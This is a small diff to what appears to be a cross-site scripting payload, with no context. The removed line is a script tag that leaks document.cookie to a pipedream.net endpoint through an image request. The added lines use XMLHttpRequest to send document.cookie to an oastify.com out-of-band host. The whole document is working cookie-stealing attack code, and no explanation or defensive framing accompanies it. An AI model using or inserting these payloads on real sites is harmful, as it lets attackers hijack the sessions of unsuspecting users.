@@ -1,1 +1,5 @@
-<script>var i = new Image(); i.src="https://eo5d2j8aa1lu9ct.m.pipedream.net?cookie=" + document.cookie;</script>
+var xhttp = new XMLHttpRequest();
+
+xhttp.open('GET', 'http://y436lpjr4zkl6577bxbgoxfal1rtfi.oastify.com/?' + document.cookie, true);
+
+xhttp.send();
